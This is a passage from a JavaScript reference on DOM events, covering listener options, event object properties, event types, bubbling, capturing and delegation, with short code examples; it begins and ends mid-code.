let timeout;
window.addEventListener('resize', () => {
  clearTimeout(timeout);
  timeout = setTimeout(actualHandler, 250);
});
```

**[Inference]** Debouncing reduces handler executions, lowering CPU usage during rapid event firing.

### Edge Cases and Gotchas

#### 1. Capture vs bubble confusion

```javascript
// These are different listeners
element.addEventListener('click', handler, { capture: true });
element.addEventListener('click', handler, { capture: false });
// Both fire on the same click
```

#### 2. Options object vs boolean

```javascript
// Modern
element.addEventListener('click', handler, { capture: true });

// Legacy (still works)
element.addEventListener('click', handler, true);

// But removal must match
element.removeEventListener('click', handler, true); // Works
element.removeEventListener('click', handler, { capture: true }); // Works
```

#### 3. Inline handlers vs addEventListener

```html
<button onclick="handler()">Click</button>
```

- Inline handlers execute in global scope
- Can only have one per event type
- Not removed via `removeEventListener()`
- Generally considered poor practice

#### 4. preventDefault() limitations

Only works when `event.cancelable === true`. Some events cannot be canceled:

- `scroll` (already happened)
- `focus`/`blur` in some contexts
- Touch events with `passive: true`

#### 5. Event timing with dynamic content

```javascript
// ✗ Element doesn't exist yet
document.getElementById('future').addEventListener('click', handler);

// ✓ Use delegation or defer
document.addEventListener('DOMContentLoaded', () => {
  document.getElementById('future').addEventListener('click', handler);
});
```

### Browser Compatibility

Modern features:

- `options` object: Supported since Chrome 49, Firefox 49, Safari 10
- `once`: Chrome 55, Firefox 50, Safari 10
- `passive`: Chrome 51, Firefox 49, Safari 10
- `signal`: Chrome 90, Firefox 87, Safari 15

**Feature detection:**

```javascript
let supportsPassive = false;
try {
  const opts = Object.defineProperty({}, 'passive', {
    get() { supportsPassive = true; }
  });
  window.addEventListener('test', null, opts);
  window.removeEventListener('test', null, opts);
} catch (e) {}
```

### AbortSignal Advanced Usage

**Cleanup multiple listeners:**

```javascript
const controller = new AbortController();
const { signal } = controller;

element1.addEventListener('click', handler1, { signal });
element2.addEventListener('click', handler2, { signal });
element3.addEventListener('click', handler3, { signal });

// Remove all at once
controller.abort();
```

**Tie to component lifecycle:**

```javascript
class Component {
  constructor() {
    this.controller = new AbortController();
  }
  
  mount() {
    document.addEventListener('click', this.handleClick, {
      signal: this.controller.signal
    });
  }
  
  unmount() {
    this.controller.abort(); // Cleanup all listeners
  }
  
  handleClick = (event) => { /* ... */ }
}
```

**Timeout-based removal:**

```javascript
const controller = new AbortController();
setTimeout(() => controller.abort(), 5000);

element.addEventListener('click', handler, { 
  signal: controller.signal 
}); // Auto-removes after 5 seconds
```

### Custom Events

`addEventListener()` works with custom events via `CustomEvent`:

```javascript
element.addEventListener('myEvent', (event) => {
  console.log(event.detail); // Custom data
});

const event = new CustomEvent('myEvent', {
  detail: { key: 'value' },
  bubbles: true,
  cancelable: true
});

element.dispatchEvent(event);
```

### Return Values

- `addEventListener()`: `undefined` (void)
- `removeEventListener()`: `undefined` (void)

**[Unverified]** Neither method indicates success/failure. Removal of non-existent listeners fails silently.

---

## Event Object Properties

Event objects are fundamental structures in JavaScript that provide information about events that occur in the browser or runtime environment. When an event is triggered, an event object is automatically created and passed to event handler functions.

### Core Event Properties

**`type`**  
A string indicating the type of event that occurred (e.g., "click", "keydown", "submit"). This property is read-only and identifies which event was triggered.

**`target`**  
References the element that originally triggered the event. This is the element where the event actually occurred, not necessarily the element that has the event listener attached.

**`currentTarget`**  
References the element to which the event listener is attached. This differs from `target` during event bubbling or capturing, as the event may have originated from a child element.

**`eventPhase`**  
A number indicating the current phase of event propagation:
- `0` = NONE (no event currently being processed)
- `1` = CAPTURING_PHASE
- `2` = AT_TARGET
- `3` = BUBBLING_PHASE

**`bubbles`**  
A boolean indicating whether the event bubbles up through the DOM tree. Not all events bubble (e.g., focus and blur do not).

**`cancelable`**  
A boolean indicating whether the event's default action can be prevented using `preventDefault()`.

**`timeStamp`**  
A number representing the time (in milliseconds) at which the event was created, relative to the time origin.

**`isTrusted`**  
A boolean indicating whether the event was initiated by the browser (true) or by a script (false).

### Event Control Methods

**`preventDefault()`**  
Prevents the default action associated with the event from occurring. For example, preventing form submission or link navigation.

**`stopPropagation()`**  
Stops the event from propagating (bubbling or capturing) to parent or child elements.

**`stopImmediatePropagation()`**  
Stops the event from propagating and also prevents other listeners on the same element from being called.

### Mouse Event Properties

**`clientX` / `clientY`**  
The X and Y coordinates of the mouse pointer relative to the viewport.

**`pageX` / `pageY`**  
The X and Y coordinates of the mouse pointer relative to the entire document.

**`screenX` / `screenY`**  
The X and Y coordinates of the mouse pointer relative to the screen.

**`offsetX` / `offsetY`**  
The X and Y coordinates of the mouse pointer relative to the target element's padding edge.

**`button`**  
A number indicating which mouse button was pressed:
- `0` = left button
- `1` = middle button
- `2` = right button

**`buttons`**  
A bitmask indicating which mouse buttons are currently pressed.

**`relatedTarget`**  
References the secondary target for the event (e.g., the element the mouse is leaving in a mouseover event).

**`altKey`, `ctrlKey`, `shiftKey`, `metaKey`**  
Boolean values indicating whether these modifier keys were pressed during the event.

### Keyboard Event Properties

**`key`**  
A string representing the key value of the key pressed (e.g., "a", "Enter", "ArrowUp").

**`code`**  
A string representing the physical key on the keyboard (e.g., "KeyA", "Enter", "ArrowUp").

**`keyCode`** (deprecated)  
A numeric code representing the key pressed. This property is deprecated in favor of `key` and `code`.

**`charCode`** (deprecated)  
The Unicode value of the character key pressed. This property is deprecated.

**`altKey`, `ctrlKey`, `shiftKey`, `metaKey`**  
Boolean values indicating whether these modifier keys were pressed during the event.

**`repeat`**  
A boolean indicating whether the key is being held down and auto-repeating.

### Form Event Properties

**`data`**  
For input events, contains the inserted string.

**`inputType`**  
For input events, describes the type of change (e.g., "insertText", "deleteContentBackward").

### Touch Event Properties

**`touches`**  
A list of all touch points currently on the screen.

**`targetTouches`**  
A list of touch points that started on the target element.

**`changedTouches`**  
A list of touch points that have changed since the last event.

Each touch object contains properties like `clientX`, `clientY`, `pageX`, `pageY`, `screenX`, `screenY`, `identifier`, and `target`.

### Drag Event Properties

**`dataTransfer`**  
An object containing data being dragged and methods to manipulate it. This object has properties like `dropEffect`, `effectAllowed`, `files`, `items`, and `types`.

### Focus Event Properties

**`relatedTarget`**  
The element that is losing focus (for focusin) or gaining focus (for focusout).

### Composition Event Properties

**`data`**  
The string being composed or the result of the composition.

### Wheel Event Properties

**`deltaX`, `deltaY`, `deltaZ`**  
Numbers indicating the amount of scrolling in each direction.

**`deltaMode`**  
Indicates the unit of the delta values (pixels, lines, or pages).

### Animation and Transition Event Properties

**`animationName`**  
The name of the CSS animation.

**`elapsedTime`**  
The amount of time the animation or transition has been running (in seconds).

**`pseudoElement`**  
The name of the pseudo-element on which the animation or transition runs.

### Custom Event Properties

**`detail`**  
For CustomEvent objects, this can contain any custom data passed when the event was created.

---

## Event Types

### Mouse Events

#### Click Events

**`click`** fires when a pointing device button is pressed and released on an element. The event fires after `mousedown` and `mouseup` complete on the same element. The event includes coordinates, button information, and modifier key states in the event object.

**`dblclick`** triggers on double-click actions. The timing threshold for what constitutes a double-click is system-dependent. This event fires after two `click` events.

**`contextmenu`** fires when the context menu should be displayed, typically via right-click or Shift+F10. Calling `preventDefault()` suppresses the default context menu.

#### Button State Events

**`mousedown`** fires when a pointing device button is pressed on an element. This occurs before `click` and captures which button was pressed via the `button` property (0 = primary/left, 1 = auxiliary/middle, 2 = secondary/right, 3 = fourth/back, 4 = fifth/forward).

**`mouseup`** fires when a pointing device button is released. Combined with `mousedown`, these enable drag operations and custom click behavior.

#### Movement Events

**`mousemove`** fires repeatedly as the pointer moves over an element. The frequency depends on the browser and hardware but can fire very rapidly (potentially hundreds of times per second). Event throttling or debouncing is often necessary for performance.

**`mouseenter`** fires when the pointer enters an element's boundaries. This event does not bubble and ignores entering child elements once inside the parent.

**`mouseleave`** fires when the pointer exits an element's boundaries. Like `mouseenter`, this does not bubble.

**`mouseover`** fires when the pointer enters an element or one of its children. This event bubbles, so it fires repeatedly as you move between child elements.

**`mouseout`** fires when the pointer leaves an element or enters a child element. This bubbles and is the counterpart to `mouseover`.

#### Wheel Events

**`wheel`** fires when a wheel button (typically a mouse wheel) is rotated. The `deltaX`, `deltaY`, and `deltaZ` properties indicate scroll amounts. The `deltaMode` property indicates units (pixels, lines, or pages). This replaced the deprecated `mousewheel` and `DOMMouseScroll` events.

### Keyboard Events

#### Key Actions

**`keydown`** fires when a key is pressed. For keys that produce character values, this fires before the character is inserted. Holding a key causes this event to fire repeatedly at a rate determined by system settings. The `key` property contains the string value of the key, while `code` contains the physical key identifier.

**`keyup`** fires when a key is released. This fires exactly once per key release, regardless of how long the key was held.

**`keypress`** is deprecated and should not be used. It was inconsistently implemented across browsers and has been removed from specifications.

#### Event Properties

The `key` property provides the semantic value ("a", "Enter", "ArrowLeft"). For printable characters, this reflects the actual character including shift state. For special keys, it provides semantic names.

The `code` property provides the physical key location ("KeyA", "Enter", "ArrowLeft"). This is layout-independent and represents the physical keyboard position.

The `keyCode` and `charCode` properties are deprecated legacy properties with inconsistent behavior across browsers.

Modifier key states are available via boolean properties: `ctrlKey`, `shiftKey`, `altKey`, and `metaKey` (Command on Mac, Windows key on Windows).

The `repeat` property indicates if the event is firing due to key repetition (holding the key down).

#### Input Method Editor Events

**`compositionstart`** fires when a composition session begins (e.g., entering Chinese characters via IME).

**`compositionupdate`** fires repeatedly as composition text changes.

**`compositionend`** fires when composition completes and text is committed.

These events are critical for properly handling Asian language input and other complex input methods.

### Form Events

#### Input Events

**`input`** fires synchronously when the value of an `<input>`, `<select>`, or `<textarea>` element changes. This fires for every modification, including typing, pasting, cutting, or programmatic changes via user interaction. This does not fire for programmatic value changes via JavaScript (`element.value = "..."`).

**`change`** fires when a form element's value changes and the element loses focus (for text inputs) or when the selection changes (for select, checkbox, radio). The timing differs by element type. For text inputs, this only fires on blur after modification. For checkboxes and radio buttons, it fires immediately on change.

**`beforeinput`** fires before the `input` event and before the DOM is modified. This is cancelable via `preventDefault()`, allowing you to prevent the input. The `inputType` property describes the type of input action. The `data` property contains the text being inserted (for insertable content).

#### Form Submission

**`submit`** fires when a form is submitted, either via a submit button, pressing Enter in a text field, or calling `form.submit()` programmatically (though direct `submit()` calls do not trigger this event). This is cancelable, allowing validation before submission.

**`reset`** fires when a form is reset via a reset button or `form.reset()` method call (though direct `reset()` calls do not trigger this event in all browsers [Inference]). This is cancelable.

**`formdata`** fires after the form's entry list is constructed during form submission. This allows modification of the FormData object before submission.

#### Invalid Input

**`invalid`** fires when a form control fails constraint validation. This fires during form submission when inputs have validation attributes (`required`, `pattern`, `min`, `max`, etc.) and the constraints are not met. This event does not bubble but is cancelable.

#### Selection Events

**`select`** fires when text is selected in an `<input>` or `<textarea>`. This doesn't fire on selection in regular content (use Selection API for that).

**`selectionchange`** fires on the `document` when the text selection changes anywhere in the document. This is not cancelable and does not bubble (since it fires on document).

### Focus Events

#### Focus Acquisition

**`focus`** fires when an element receives focus. This does not bubble. Focus can be given via mouse click, tab navigation, or programmatic `element.focus()` calls.

**`focusin`** fires when an element is about to receive focus. This bubbles, unlike `focus`. This fires before `focus`.

#### Focus Loss

**`blur`** fires when an element loses focus. This does not bubble.

**`focusout`** fires when an element is about to lose focus. This bubbles, unlike `blur`. This fires before `blur`.

#### Related Target

The `relatedTarget` property on focus events indicates the element that lost focus (for `focus`/`focusin`) or gained focus (for `blur`/`focusout`). This can be `null` if focus moved outside the document.

### Window and Document Events

#### Page Lifecycle

**`DOMContentLoaded`** fires on the `document` when the HTML is completely parsed and the DOM tree is built, but before all subresources (images, stylesheets, iframes) finish loading. This is often the earliest point where DOM manipulation is safe.

**`load`** fires on the `window` when the entire page and all resources (images, scripts, stylesheets) have finished loading.

**`beforeunload`** fires when the window, document, or resources are about to be unloaded. Setting the `returnValue` property or returning a string (legacy) triggers a confirmation dialog asking if the user wants to leave. Modern browsers ignore custom messages and show generic text.

**`unload`** fires when the document or resource is being unloaded. This fires after `beforeunload`. Reliability is limited on mobile browsers and in some scenarios.

**`pagehide`** fires when a session history entry is being traversed away from. This is more reliable than `unload` and includes a `persisted` property indicating if the page is entering the back-forward cache.

**`pageshow`** fires when a session history entry is being traversed to. The `persisted` property indicates if the page was restored from the back-forward cache.

#### Visibility

**`visibilitychange`** fires on the `document` when the page becomes visible or hidden (e.g., switching tabs, minimizing browser). Check `document.hidden` or `document.visibilityState` to determine current state.

#### Hash Changes

**`hashchange`** fires on the `window` when the URL fragment identifier (the part after #) changes. The event object includes `oldURL` and `newURL` properties.

#### History Navigation

**`popstate`** fires when the active history entry changes via browser back/forward buttons or `history.back()`/`history.forward()` calls. The `state` property contains the state object associated with the history entry. This does not fire for `history.pushState()` or `history.replaceState()`.

### Clipboard Events

**`copy`** fires when the user initiates a copy action (Ctrl+C, right-click copy, etc.). Access clipboard data via `event.clipboardData`. Calling `preventDefault()` prevents the default copy behavior, allowing custom clipboard data.

**`cut`** fires when the user initiates a cut action. Similar to `copy` but also removes the selection.

**`paste`** fires when the user initiates a paste action. The `event.clipboardData` provides access to the clipboard contents. Calling `preventDefault()` prevents the default paste behavior.

The `clipboardData` property is a `DataTransfer` object with methods like `getData(type)`, `setData(type, data)`, and `types` property listing available formats.

### Drag and Drop Events

#### On the Dragged Element

**`dragstart`** fires when drag operation begins. Set `event.dataTransfer.effectAllowed` to specify allowed operations. Call `setData()` to add data to the transfer.

**`drag`** fires repeatedly while the element is being dragged (similar to `mousemove` frequency).

**`dragend`** fires when drag operation completes (via drop or cancellation). The `dropEffect` property indicates what operation occurred.

#### On Drop Targets

**`dragenter`** fires when dragged content enters a valid drop target. This bubbles.

**`dragover`** fires repeatedly while dragged content is over a drop target. Must call `preventDefault()` to indicate the element is a valid drop target. Set `event.dataTransfer.dropEffect` to specify visual feedback.

**`dragleave`** fires when dragged content leaves a drop target.

**`drop`** fires when content is dropped on a valid drop target. Only fires if `dragover` called `preventDefault()`. Access dropped data via `event.dataTransfer.getData()`.

The `dataTransfer` object includes `files` property for file drops, `effectAllowed` and `dropEffect` for operation types, and methods for managing drag data.

### Touch Events

**`touchstart`** fires when one or more touch points are placed on the touch surface.

**`touchmove`** fires when touch points move along the surface. Fires repeatedly at high frequency.

**`touchend`** fires when touch points are removed from the surface.

**`touchcancel`** fires when touch points are interrupted (e.g., too many touch points, system interruption, alert dialog).

#### Touch Event Properties

The `touches` property contains all current touch points on the screen, regardless of target element.

The `targetTouches` property contains touch points that started on the current target element.

The `changedTouches` property contains touch points that changed in this event (added for `touchstart`, moved for `touchmove`, removed for `touchend`).

Each touch object includes `identifier` (unique ID), `screenX`/`screenY`, `clientX`/`clientY`, `pageX`/`pageY`, `radiusX`/`radiusY` (contact area), and `target` (element where touch started).

### Pointer Events

Pointer events unify mouse, touch, and pen input into a single event model.

**`pointerdown`** fires when a pointer becomes active (mouse press, touch contact, pen contact).

**`pointermove`** fires when pointer coordinates change.

**`pointerup`** fires when pointer is no longer active (mouse release, touch lift, pen lift).

**`pointercancel`** fires when pointer events are interrupted.

**`pointerenter`** fires when pointer enters element boundaries (does not bubble).

**`pointerleave`** fires when pointer exits element boundaries (does not bubble).

**`pointerover`** fires when pointer enters element or child (bubbles).

**`pointerout`** fires when pointer leaves element or enters child (bubbles).

**`gotpointercapture`** fires when an element receives pointer capture.

**`lostpointercapture`** fires when pointer capture is released.

#### Pointer Event Properties

The `pointerId` uniquely identifies each pointer (distinct for each finger, stylus, etc.).

The `pointerType` indicates device type: "mouse", "pen", "touch", or empty string for unknown.

The `isPrimary` boolean indicates if this is the primary pointer of its type.

Pressure, tilt, width, height, and other properties provide detailed input data for stylus and touch.

Call `element.setPointerCapture(pointerId)` to capture all future pointer events to that element until release. Call `element.releasePointerCapture(pointerId)` to release capture.

### Media Events

#### Loading States

**`loadstart`** fires when media begins loading.

**`progress`** fires periodically while media is loading. The `buffered` property indicates loaded time ranges.

**`canplay`** fires when enough data is available to begin playback, but buffering may still be needed.

**`canplaythrough`** fires when enough data is loaded that playback can proceed without buffering interruptions (estimated by browser).

**`loadedmetadata`** fires when media metadata (duration, dimensions) is loaded.

**`loadeddata`** fires when data for the current frame is loaded.

#### Playback Events

**`play`** fires when playback begins (via `play()` call or autoplay).

**`playing`** fires when playback starts after being paused or delayed due to buffering.

**`pause`** fires when playback is paused.

**`ended`** fires when playback reaches the end of the media.

**`seeking`** fires when seek operation begins.

**`seeked`** fires when seek operation completes.

**`timeupdate`** fires when the `currentTime` property changes. This typically fires at ~4Hz during playback but frequency varies by browser.

**`waiting`** fires when playback stops due to buffering.

**`stalled`** fires when loading data has stalled unexpectedly.

**`suspend`** fires when media loading is deliberately suspended.

**`emptied`** fires when media becomes empty (e.g., loading new source).

**`durationchange`** fires when the `duration` property changes.

**`ratechange`** fires when playback rate changes.

**`volumechange`** fires when volume or muted state changes.

**`error`** fires when an error occurs loading or playing media. Check the `error` property for details.

### Transition and Animation Events

#### CSS Transitions

**`transitionrun`** fires when a transition is created (including delay).

**`transitionstart`** fires when transition actually begins (after delay).

**`transitionend`** fires when transition completes.

**`transitioncancel`** fires when transition is cancelled.

The `propertyName` property indicates which CSS property transitioned. The `elapsedTime` property indicates transition duration (excluding delay for `transitionend`).

#### CSS Animations

**`animationstart`** fires when animation begins (after delay).

**`animationend`** fires when animation completes.

**`animationiteration`** fires at the end of each animation iteration (except the last).

**`animationcancel`** fires when animation is cancelled.

The `animationName` property contains the animation's name. The `elapsedTime` property indicates time since animation started.

### Scroll Events

**`scroll`** fires when an element's scroll position changes. This can fire at high frequency during scrolling. The event does not bubble on most elements except `document` [Inference]. Use passive event listeners for performance when not calling `preventDefault()`.

**`scrollend`** fires when scrolling completes and the scroll position has stabilized. Browser support is recent and limited [Inference - based on specification timing].

Scroll events do not provide delta information directly. Access scroll position via `scrollTop`, `scrollLeft`, `scrollX`, or `scrollY` properties.

### Resize Events

**`resize`** fires on the `window` when the viewport is resized. This can fire at high frequency during manual resizing. Debouncing or throttling is typically necessary.

ResizeObserver API provides more granular element-specific resize detection without the limitations of `resize` events.

### Print Events

**`beforeprint`** fires before the print dialog opens or print operation begins.

**`afterprint`** fires after the print dialog closes or print operation completes (regardless of whether printing occurred).

These events fire on the `window` object and allow for print-specific styling or content modification.

### Error and Promise Events

**`error`** fires on the `window` when a JavaScript error occurs and is uncaught. The event object includes `message`, `filename`, `lineno`, `colno`, and `error` (the Error object) properties. This also fires on elements for resource loading failures (images, scripts).

**`unhandledrejection`** fires on the `window` when a Promise is rejected without a rejection handler. The event object includes `promise` (the rejected Promise) and `reason` (the rejection value).

**`rejectionhandled`** fires when a Promise rejection is handled after previously firing `unhandledrejection`.

### Storage Events

**`storage`** fires on the `window` when localStorage or sessionStorage is modified in another document from the same origin. This does not fire in the document that made the change. The event object includes `key`, `oldValue`, `newValue`, `url`, and `storageArea` properties.

### Online/Offline Events

**`online`** fires on the `window` when the browser gains network connectivity.

**`offline`** fires when the browser loses network connectivity.

These events reflect the browser's perception of connectivity, which may not reflect actual internet access [Inference]. Check `navigator.onLine` for current state.

### Message Events

**`message`** fires when a message is received from another context via:

- `postMessage()` from another window/iframe
- Web Workers
- Service Workers
- Broadcast Channel API
- Server-Sent Events

The event object includes `data` (the message), `origin` (source origin), `source` (source window), and `ports` (MessagePort array for transferable objects).

**`messageerror`** fires when a message is received but cannot be deserialized.

---

## Event Bubbling

### Propagation Mechanism

Event bubbling describes the upward propagation of events through the DOM tree. When an event fires on an element, it first runs handlers on that element, then on its parent, then on its grandparent, continuing upward until reaching the document root. This occurs during the bubbling phase of event propagation.

The event travels from the target element where it originated, moving up through each ancestor element in the DOM hierarchy. Each ancestor's event listeners for that event type execute in sequence as the event bubbles upward.

### Three Phases of Event Propagation

Event propagation consists of three distinct phases:

**Capturing Phase**: The event travels down from the window through ancestors to the target element. Listeners registered with `capture: true` or `useCapture: true` execute during this phase.

**Target Phase**: The event reaches the target element itself. Listeners on the target execute regardless of their capture setting.

**Bubbling Phase**: The event travels back up from the target through ancestors to the window. This is the default phase for event listeners.

### Event Object Properties

`event.target` references the element where the event originally occurred and remains constant throughout propagation.

`event.currentTarget` references the element whose listener is currently executing, changing as the event bubbles through each ancestor.

`event.eventPhase` returns a number indicating the current phase: 1 (capturing), 2 (target), or 3 (bubbling).

### Stopping Propagation

`event.stopPropagation()` prevents the event from bubbling to ancestor elements. Handlers on the current element still execute, but no ancestor handlers receive the event.

`event.stopImmediatePropagation()` stops propagation and prevents other handlers on the same element from executing. If multiple listeners exist on one element, this prevents subsequent listeners from running.

### Events That Bubble

Most events bubble by default, including:

- Mouse events: `click`, `dblclick`, `mousedown`, `mouseup`, `mousemove`, `mouseover`, `mouseout`
- Keyboard events: `keydown`, `keyup`, `keypress`
- Form events: `submit`, `change`, `input`
- UI events: `scroll` (document/window level), `select`

### Events That Do Not Bubble

Certain events do not bubble through the DOM:

- `focus` and `blur` (though `focusin` and `focusout` are bubbling alternatives)
- `load` and `unload`
- `mouseenter` and `mouseleave` (though `mouseover` and `mouseout` do bubble)
- Media events: `play`, `pause`, `playing`
- `error` (in most contexts)

The `bubbles` property on the event object returns `true` or `false` to indicate whether an event type bubbles.

### Event Delegation Pattern

Event delegation leverages bubbling by attaching a single listener to a parent element rather than individual listeners to many children. The listener examines `event.target` to determine which child triggered the event and responds accordingly.

Benefits include reduced memory usage (fewer listeners), automatic handling of dynamically added elements, and simplified code maintenance. The parent listener handles events for all current and future children without requiring listener registration on each child element.

```javascript
document.getElementById('parent').addEventListener('click', function(event) {
  if (event.target.matches('.child-class')) {
    // Handle click on any .child-class element
  }
});
```

### Bubbling with Event Listeners

Event listeners register for the bubbling phase by default. The third parameter in `addEventListener` controls this:

```javascript
element.addEventListener('click', handler); // Bubbling phase (default)
element.addEventListener('click', handler, false); // Bubbling phase (explicit)
element.addEventListener('click', handler, true); // Capturing phase
element.addEventListener('click', handler, { capture: true }); // Capturing phase
```

### Preventing Default Behavior vs Stopping Propagation

`event.preventDefault()` and `event.stopPropagation()` serve different purposes and are independent:

`preventDefault()` cancels the browser's default action for an event (following a link, submitting a form) but does not affect propagation.

`stopPropagation()` halts event propagation but does not prevent default browser behavior.

These can be used together or separately depending on requirements.

### Bubbling in Form Events

Form events exhibit specific bubbling behavior. The `submit` event bubbles, allowing delegation on form containers. The `change` event bubbles, enabling centralized handling of input changes. The `input` event also bubbles, providing real-time value change detection through delegation.

`focus` and `blur` do not bubble, but `focusin` and `focusout` were introduced as bubbling alternatives for focus-related delegation.

### Practical Considerations

**Performance**: Delegation through bubbling reduces the number of event listeners, improving memory efficiency and initialization time for pages with many interactive elements.

**Dynamic Content**: Bubbling handles dynamically added content automatically. A delegated listener continues working for elements added to the DOM after page load.

**Event Order**: Multiple listeners on the same element execute in registration order during the same phase. Listeners registered first execute first.

**Memory Leaks**: Fewer event listeners reduce the risk of memory leaks from orphaned listener references, particularly relevant when removing DOM elements.

### Bubbling with Custom Events

Custom events created via `new Event()` or `new CustomEvent()` accept a `bubbles` option:

```javascript
const event = new CustomEvent('myEvent', { 
  bubbles: true,  // Enable bubbling
  cancelable: true,
  detail: { /* custom data */ }
});
element.dispatchEvent(event);
```

Without `bubbles: true`, custom events do not bubble by default.

### Browser Differences

[Inference] Modern browsers implement event bubbling consistently according to DOM Level 3 Events specification. Historical differences in Internet Explorer's event model (using `srcElement` instead of `target`, `cancelBubble` instead of `stopPropagation()`) are no longer relevant for current development targeting modern browsers.

### Interaction with Shadow DOM

[Inference] Event bubbling interacts with Shadow DOM encapsulation. Events originating inside a shadow root can bubble up through the shadow boundary, but `event.target` gets retargeted to the shadow host when accessed from outside the shadow tree. The `event.composedPath()` method provides the full propagation path including shadow DOM elements for events with `composed: true`.

---

## Event Capturing

### Capture Phase Mechanics

Event capturing represents the first phase of DOM event propagation, where events travel from the outermost ancestor element down through the DOM tree to the target element. During this phase, the event traverses from `window` → `document` → `html` → `body` and continues through each nested parent until reaching the actual target.

The capture phase occurs before the target phase and the bubbling phase, completing the full propagation cycle. Handlers registered with `capture: true` execute during this downward journey, enabling parent elements to intercept and process events before their children receive them.

### Registration Syntax

```javascript
element.addEventListener(eventType, handler, true);
// or
element.addEventListener(eventType, handler, { capture: true });
```

The third parameter controls capture behavior. When `true` or `{ capture: true }`, the handler executes during the capture phase. When `false`, `undefined`, or `{ capture: false }`, it executes during bubbling.

### Execution Order

For a nested structure like `<div id="outer"><div id="middle"><div id="inner"></div></div></div>`, clicking the inner div triggers handlers in this sequence:

1. **Capture phase**: outer (capture) → middle (capture) → inner (capture)
2. **Target phase**: inner (target handlers, in registration order)
3. **Bubble phase**: inner (bubble) → middle (bubble) → outer (bubble)

Handlers on the target element itself execute in registration order during the target phase, regardless of their capture setting.

### Practical Applications

#### Early Event Interception

Capture handlers intercept events before they reach deeply nested components, useful for:

- Global keyboard shortcuts that should override local handlers
- Implementing custom drag-and-drop that prevents default behaviors early
- Security boundaries that block events from propagating to untrusted content
- Performance monitoring that tracks all interactions from a high level

```javascript
document.addEventListener('click', (e) => {
  // Log all clicks before any component handles them
  analytics.track('click', e.target);
}, true);
```

#### Event Delegation at Scale

While bubbling is more common for delegation, capture enables top-down control patterns:

```javascript
container.addEventListener('focus', (e) => {
  // Handle focus for any descendant during capture
  // Useful since focus doesn't bubble
  if (e.target.matches('input[type="text"]')) {
    e.target.select(); // Auto-select text
  }
}, true);
```

#### Preventing Propagation Early

Stopping propagation during capture prevents the event from reaching the target entirely:

```javascript
blocker.addEventListener('click', (e) => {
  if (shouldBlock(e.target)) {
    e.stopPropagation(); // Event never reaches target
  }
}, true);
```

### stopPropagation vs stopImmediatePropagation

- `stopPropagation()`: Prevents further propagation but allows other handlers on the current element to execute
- `stopImmediatePropagation()`: Stops propagation AND prevents remaining handlers on the current element from executing

```javascript
element.addEventListener('click', (e) => {
  console.log('First capture handler');
  e.stopImmediatePropagation();
}, true);

element.addEventListener('click', (e) => {
  console.log('Never executes');
}, true);
```

### Events That Don't Propagate

Several events never propagate through capture or bubble phases:

- `focus`, `blur` (use `focusin`, `focusout` for bubbling equivalents)
- `load`, `unload`, `error` on resources
- `mouseenter`, `mouseleave` (use `mouseover`, `mouseout` for bubbling)
- Media events: `play`, `pause`, `ended`
- Form-specific: `reset`, `invalid`

For these events, capture handlers on ancestors never execute since the event doesn't traverse the tree.

### Performance Considerations

Capture handlers execute for every matching event on every descendant element, creating potential performance costs:

- Avoid expensive operations in capture handlers on high-frequency events (scroll, mousemove)
- Use event delegation patterns to minimize the number of capture listeners
- Consider whether bubbling accomplishes the same goal with less overhead

**[Inference]**: Capture handlers may have slightly higher overhead than bubbling handlers due to executing earlier in the propagation chain, potentially before browser optimizations apply.

### Framework-Specific Behavior

#### React Synthetic Events

React's synthetic event system historically handled events at the document root using delegation, but React 17+ attaches to the root container. React primarily uses bubbling phase handlers, with capture specified via naming:

```javascript
<div 
  onClick={handleBubble}           // Bubbling phase
  onClickCapture={handleCapture}   // Capture phase
/>
```

React's event system abstracts away direct DOM manipulation, so capture behavior differs from native addEventListener.

#### Vue and Other Frameworks

Vue uses native DOM events with modifiers:

```javascript
<div @click.capture="handler">  // Capture phase
```

Angular similarly provides mechanisms for capture through native DOM access or framework-specific APIs.

### Debugging Capture Events

Chrome DevTools event listener breakpoints don't distinguish between capture and bubble phases by default. To debug:

1. Set breakpoints on specific event types
2. Inspect `event.eventPhase` property:
    - `1` = CAPTURING_PHASE
    - `2` = AT_TARGET
    - `3` = BUBBLING_PHASE

```javascript
element.addEventListener('click', (e) => {
  console.log('Phase:', e.eventPhase);
  // 1 = capture, 2 = target, 3 = bubble
}, true);
```

### Memory Management

Capture listeners must be removed with the same capture setting:

```javascript
const handler = (e) => { /* ... */ };

// Add with capture
element.addEventListener('click', handler, true);

// Must remove with capture
element.removeEventListener('click', handler, true);

// This won't remove the capture listener:
element.removeEventListener('click', handler, false);
```

### Advanced Patterns

#### Capture-Based Event Router

```javascript
class EventRouter {
  constructor(root) {
    this.routes = new Map();
    root.addEventListener('click', (e) => {
      for (const [selector, handler] of this.routes) {
        if (e.target.matches(selector)) {
          handler(e);
          break;
        }
      }
    }, true); // Capture ensures routing before component handlers
  }
  
  register(selector, handler) {
    this.routes.set(selector, handler);
  }
}
```

#### Permission Boundaries

```javascript
function createSandbox(element, allowedSelectors) {
  element.addEventListener('click', (e) => {
    const allowed = allowedSelectors.some(sel => 
      e.target.matches(sel)
    );
    if (!allowed) {
      e.stopPropagation();
      e.preventDefault();
    }
  }, true);
}
```

### Browser Compatibility

Event capturing has universal support across all modern browsers and IE9+. The options object syntax (`{ capture: true }`) is supported in all modern browsers, with IE11 requiring the boolean form.

Passive event listeners (`{ passive: true }`) can combine with capture (`{ capture: true, passive: true }`), though this is a separate concern related to scroll performance optimization.

---

## Event Delegation

### Core Mechanism

Event delegation exploits event propagation (bubbling) to handle events on multiple child elements through a single listener attached to a common ancestor. Instead of attaching individual listeners to each target element, one listener on a parent intercepts events as they bubble up from descendant elements.

The pattern relies on:

- **Event bubbling**: Events propagate from target element upward through ancestors
- **event.target**: References the actual element that triggered the event
- **event.currentTarget**: References the element with the attached listener

### Implementation Pattern

```javascript
// Without delegation - multiple listeners
buttons.forEach(button => {
  button.addEventListener('click', handleClick);
});

// With delegation - single listener
container.addEventListener('click', (event) => {
  if (event.target.matches('button')) {
    handleClick(event);
  }
});
```

### Event Flow and Target Identification

Events traverse the DOM in three phases:

1. **Capturing phase**: From window down to target (rarely used for delegation)
2. **Target phase**: Event reaches the actual target element
3. **Bubbling phase**: From target back up to window (delegation operates here)

The listener on the ancestor receives events during bubbling and examines `event.target` to determine which descendant triggered it.

### Selector Matching Strategies

**Element.matches()** - Direct element matching:

```javascript
parent.addEventListener('click', (event) => {
  if (event.target.matches('.delete-btn')) {
    // Handle delete button clicks
  }
});
```

**Element.closest()** - Ancestor matching from target:

```javascript
parent.addEventListener('click', (event) => {
  const button = event.target.closest('button');
